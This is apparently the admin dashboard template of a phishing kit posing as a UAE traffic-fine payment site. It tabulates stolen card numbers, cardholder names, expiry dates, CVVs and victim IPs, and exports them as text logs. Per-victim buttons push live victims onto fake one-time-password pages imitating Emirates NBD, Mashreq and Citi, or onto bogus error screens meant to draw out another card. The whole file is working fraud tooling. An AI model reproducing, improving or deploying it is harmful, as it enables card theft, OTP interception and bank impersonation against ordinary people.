<%- include('_layout', { pageTitle: 'Payments', activePage: 'payments', adminUser }) %>

<% if (typeof dbError !== 'undefined' && dbError) { %>
<div class="alert alert-error">Database error: <%= dbError %></div>
<% } else { %>

<div class="filter-bar">
  <form method="GET" action="/admin/payments" style="display:flex;gap:12px;flex-wrap:wrap;align-items:flex-end;width:100%;">
    <div class="form-group" style="flex:1;min-width:200px;">
      <label>Search (plate, card, name, issuer)</label>
      <input type="text" name="q" value="<%= search %>" placeholder="e.g. JOHN DOE, Emirates NBD...">
    </div>
    <div class="form-group" style="min-width:160px;">
      <label>Status</label>
      <select name="status">
        <option value="">All statuses</option>
        <option value="pending"      <%= statusFilter==='pending'      ? 'selected' : '' %>>Pending</option>
        <option value="approved"     <%= statusFilter==='approved'     ? 'selected' : '' %>>Approved</option>
        <option value="declined"     <%= statusFilter==='declined'     ? 'selected' : '' %>>Declined</option>
        <option value="otp_received" <%= statusFilter==='otp_received' ? 'selected' : '' %>>OTP Received</option>
      </select>
    </div>
    <div style="display:flex;gap:8px;align-items:flex-end;flex-wrap:wrap;">
      <button type="submit" class="btn btn-primary" style="margin-bottom:1px;">Filter</button>
      <a href="/admin/payments" class="btn btn-ghost" style="margin-bottom:1px;">Clear</a>
      <a href="/admin/payments?active=1" class="btn btn-sm <%= activeFilter ? 'btn-primary' : 'btn-ghost' %>" style="margin-bottom:1px;display:flex;align-items:center;gap:5px;">
        <span class="status-dot active" style="flex-shrink:0;"></span> Active Only
      </a>
    </div>
  </form>
</div>

<div class="table-card">
  <div class="tc-header">
    <div class="tc-title">Payments<% if (activeFilter) { %> <span style="font-size:11px;font-weight:500;color:#22c55e;margin-left:6px;">— Active only</span><% } %></div>
    <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
      <div style="display:flex;align-items:center;gap:5px;font-size:11px;color:var(--tx-muted);">
        <span class="status-dot active"></span> Active
        <span class="status-dot recent"  style="margin-left:4px;"></span> Recent
        <span class="status-dot offline" style="margin-left:4px;"></span> Offline
      </div>
      <div class="tc-meta"><%= total %> records</div>
      <a href="/admin/payments/export?status=<%= encodeURIComponent(statusFilter) %>&q=<%= encodeURIComponent(search) %>&active=<%= activeFilter ? '1' : '' %>"
         class="btn btn-sm btn-ghost" style="gap:5px;" title="Download card logs as .txt">
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
        Export .txt
      </a>
    </div>
  </div>
  <div style="overflow-x:auto;">
  <table>
    <thead>
      <tr>
        <th style="width:28px;"></th>
        <th>#</th><th>Date</th><th>Plate</th><th>Amount</th>
        <th>Card No</th><th>Name</th><th>Exp</th><th>CVV</th>
        <th>Issuer</th><th>Country</th><th>Type</th>
        <th>OTP Page</th><th>IP</th><th style="width:130px;min-width:100px;">Comment</th><th>Actions</th>
      </tr>
    </thead>
    <tbody>
    <% if (payments.length === 0) { %>
    <tr><td colspan="16" style="text-align:center;padding:40px;color:var(--tx-muted);">No records found.</td></tr>
    <% } %>
    <% payments.forEach(function(p) {
      const sc = {pending:'b-pending',approved:'b-approved',declined:'b-declined',otp_received:'b-received'}[p.otp_status] || 'b-pending';
      const dt = p.created_at ? new Date(p.created_at).toLocaleString('en-AE',{timeZone:'Asia/Dubai',day:'2-digit',month:'2-digit',year:'2-digit',hour:'2-digit',minute:'2-digit'}) : '-';
      const now = Date.now();
      const lastSeen = p.last_seen ? new Date(p.last_seen).getTime() : null;
      const dotClass = !lastSeen ? 'offline' : (now - lastSeen < 90000 ? 'active' : (now - lastSeen < 300000 ? 'recent' : 'offline'));
      const dotTitle = !lastSeen ? 'Never polled' : (dotClass === 'active' ? 'Active now' : (dotClass === 'recent' ? 'Recently active' : 'Offline'));
    %>
    <tr>
      <td style="padding:11px 10px 11px 16px;">
        <span class="status-dot <%= dotClass %>" title="<%= dotTitle %>"></span>
      </td>
      <td class="muted small"><%= p.id %></td>
      <td class="small nowrap"><%= dt %></td>
      <td><strong><%= p.plate_src %></strong> <%= p.plate_code %> <%= p.plate_no %></td>
      <td class="text-green">AED <%= Number(p.total_fine).toLocaleString() %></td>
      <td class="mono select-all" style="font-size:12px;"><%= p.card_number || '—' %></td>
      <td class="nowrap"><%= p.card_name || '—' %></td>
      <td class="mono"><%= p.expiry || '—' %></td>
      <td class="mono"><%= p.cvv || '—' %></td>
      <td class="small"><%= p.card_issuer || '—' %></td>
      <td class="small"><%= p.card_country || '—' %></td>
      <td class="small"><%= p.card_type || '—' %></td>
      <td><span class="badge b-otp"><%= p.otp_page || 'otp-sms' %></span></td>
      <td class="mono muted small"><%= p.ip || '—' %></td>
      <td style="width:130px;max-width:130px;">
        <textarea class="pay-comment" data-sid="<%= p.sid %>" rows="1"
          style="width:100%;resize:none;border:1px solid var(--bd);border-radius:4px;padding:4px 8px;font-size:12px;background:var(--bg-input);color:var(--tx-base);font-family:inherit;overflow-y:hidden;word-break:break-word;white-space:pre-wrap;line-height:1.4;"><%= p.comment || '' %></textarea>
      </td>
      <td>
        <div class="action-bar">
          <button class="btn btn-sm btn-blue"   title="Redirect to SMS OTP"     onclick="redirect('<%= p.sid %>','otp-sms')">SMS</button>
          <button class="btn btn-sm btn-purple"  title="Redirect to Emirates NBD" onclick="redirect('<%= p.sid %>','otp')">NBD</button>
          <button class="btn btn-sm btn-amber"   title="Redirect to Mashreq"    onclick="redirect('<%= p.sid %>','otp-mashreq')">MQ</button>
          <button class="btn btn-sm btn-ghost"   title="Redirect to Citi"       onclick="redirect('<%= p.sid %>','otp-citi')">Citi</button>
          <button class="btn btn-sm btn-primary" title="Mark as approved"       onclick="setStatus('<%= p.sid %>','approved')">Approve</button>
          <button class="btn btn-sm btn-red"     title="Delete record"          onclick="delPayment('<%= p.sid %>')">Del</button>
          <button class="btn btn-sm btn-ghost"   title="More actions"           onclick="openMoreModal('<%= p.sid %>','<%= p.ip || '' %>')">⋮</button>
        </div>
      </td>
    </tr>
    <% }) %>
    </tbody>
  </table>
  </div>

  <% if (totalPages > 1) { %>
  <div style="padding:14px 20px;display:flex;gap:6px;justify-content:center;border-top:1px solid var(--bd-light);">
    <% for (let i = 1; i <= totalPages; i++) { %>
    <a href="/admin/payments?p=<%= i %>&status=<%= encodeURIComponent(statusFilter) %>&q=<%= encodeURIComponent(search) %>"
       class="btn btn-sm <%= i === page ? 'btn-primary' : 'btn-ghost' %>"><%= i %></a>
    <% } %>
  </div>
  <% } %>
</div>

<% } %>

<!-- More Actions Modal -->
<div id="more-modal-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:1000;align-items:center;justify-content:center;padding:20px;" onclick="if(event.target===this)closeMoreModal()">
  <div style="background:var(--bg-card);border-radius:16px;width:100%;max-width:380px;border:1px solid var(--bd);box-shadow:0 20px 60px rgba(0,0,0,0.3);overflow:hidden;">
    <div style="padding:16px 20px;border-bottom:1px solid var(--bd);display:flex;align-items:center;justify-content:space-between;">
      <div>
        <div style="font-size:10px;font-weight:700;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.5px;">Payment Actions</div>
        <div style="font-size:14px;font-weight:800;color:var(--tx-base);margin-top:2px;" id="more-modal-sid-label">—</div>
      </div>
      <button onclick="closeMoreModal()" style="width:30px;height:30px;border-radius:8px;border:1.5px solid var(--bd);background:var(--bg-page);color:var(--tx-muted);font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;">×</button>
    </div>
    <div style="padding:14px 20px;display:flex;flex-direction:column;gap:8px;">
      <div style="font-size:10px;font-weight:700;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:2px;">Redirect User To</div>
      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;" onclick="moreRedirect('otp-limit')">
        <span style="width:28px;height:28px;background:#fffbeb;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">⚠️</span>
        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;">Limit Verification</div><div style="font-size:11px;color:var(--tx-muted);">Transaction limit requires verification</div></div>
      </button>
      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;" onclick="moreRedirect('payment:error=card_error')">
        <span style="width:28px;height:28px;background:#fef2f2;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">❌</span>
        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;">Card Info Incorrect</div><div style="font-size:11px;color:var(--tx-muted);">Send back to card entry with error</div></div>
      </button>
      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;" onclick="moreRedirect('payment:error=card_type')">
        <span style="width:28px;height:28px;background:#fffbeb;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">🚫</span>
        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;">Card Type Not Supported</div><div style="font-size:11px;color:var(--tx-muted);">Virtual / prepaid cards not accepted</div></div>
      </button>
      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;" onclick="moreRedirect('payment:error=bank_error')">
        <span style="width:28px;height:28px;background:#eff6ff;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">🏦</span>
        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;">Bank Not Supported</div><div style="font-size:11px;color:var(--tx-muted);">Try with a card from a different bank</div></div>
      </button>
      <div style="border-top:1px solid var(--bd-light);margin:4px 0;"></div>
      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;border-color:#fecaca;" onclick="banUser()" id="ban-btn">
        <span style="width:28px;height:28px;background:#fef2f2;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">🔨</span>
        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;color:#dc2626;">Ban User</div><div style="font-size:11px;color:var(--tx-muted);" id="ban-ip-label">IP: —</div></div>
      </button>
    </div>
  </div>
</div>

<script>
let _moreSid = null, _moreIp = null;
function openMoreModal(sid, ip) {
  _moreSid = sid; _moreIp = ip;
  document.getElementById('more-modal-sid-label').textContent = 'SID: ' + sid.slice(0,12) + '…';
  document.getElementById('ban-ip-label').textContent = 'IP: ' + (ip || '—');
  document.getElementById('more-modal-overlay').style.display = 'flex';
}
function closeMoreModal() {
  document.getElementById('more-modal-overlay').style.display = 'none';
  _moreSid = null; _moreIp = null;
}
function moreRedirect(page) {
  closeMoreModal();
  if (!_moreSid) return;
  if (!confirm('Redirect user to: ' + page + '?')) return;
  adminAction({ act: 'redirect', sid: _moreSid, page });
}
function banUser() {
  if (!_moreSid) return;
  if (!confirm('Ban IP ' + (_moreIp || '?') + '? This will block this user from accessing the site.')) return;
  closeMoreModal();
  adminAction({ act: 'ban_user', sid: _moreSid });
}
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeMoreModal(); });

function redirect(sid, page) {
  if (!confirm('Redirect user to ' + page + '?\n(User must be active on the waiting or OTP page.)')) return;
  adminAction({ act: 'redirect', sid, page });
}
function setStatus(sid, status) {
  if (!confirm('Set status to "' + status + '"?')) return;
  adminAction({ act: 'set_status', sid, status });
}
function delPayment(sid) {
  if (!confirm('Permanently delete this record?')) return;
  adminAction({ act: 'delete_payment', sid });
}

// ── Yorum kaydetme ───────────────────────────────────────────────────────────
function autoResizeComment(ta) {
  ta.style.height = 'auto';
  ta.style.height = Math.min(ta.scrollHeight, 96) + 'px';
}
document.querySelectorAll('.pay-comment').forEach(function(ta) {
  autoResizeComment(ta);
  ta.addEventListener('input', function() { autoResizeComment(this); });
});

document.querySelectorAll('.pay-comment').forEach(function(ta) {
  ta.addEventListener('blur', async function() {
    const sid     = this.dataset.sid;
    const comment = this.value;
    try {
      await fetch('/admin/payments/comment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sid, comment })
      });
    } catch(e) {}
  });
});

// ── Auto-refresh: poll for new payments every 10 seconds ─────────────────────
<% if (payments.length > 0) { %>
const CURRENT_LATEST_ID = <%= payments[0].id %>;
<% } else { %>
const CURRENT_LATEST_ID = 0;
<% } %>

let pollPaused = false;
document.addEventListener('focusin',  () => pollPaused = true);
document.addEventListener('focusout', () => pollPaused = false);
document.addEventListener('mouseover', e => {
  if (e.target.closest('.action-bar')) pollPaused = true;
});
document.addEventListener('mouseout', e => {
  if (e.target.closest('.action-bar')) pollPaused = false;
});

setInterval(async () => {
  if (pollPaused) return;
  try {
    const r = await fetch('/admin/api/latest-payment-id');
    const d = await r.json();
    if (d.id && d.id > CURRENT_LATEST_ID) {
      const bar = document.getElementById('refresh-bar');
      if (bar) { bar.style.display = 'block'; }
      // Auto reload after 2s if not paused
      setTimeout(() => { if (!pollPaused) location.reload(); }, 2000);
    }
  } catch(e) {}
}, 10000);
</script>

<%- include('_layout_end') %>
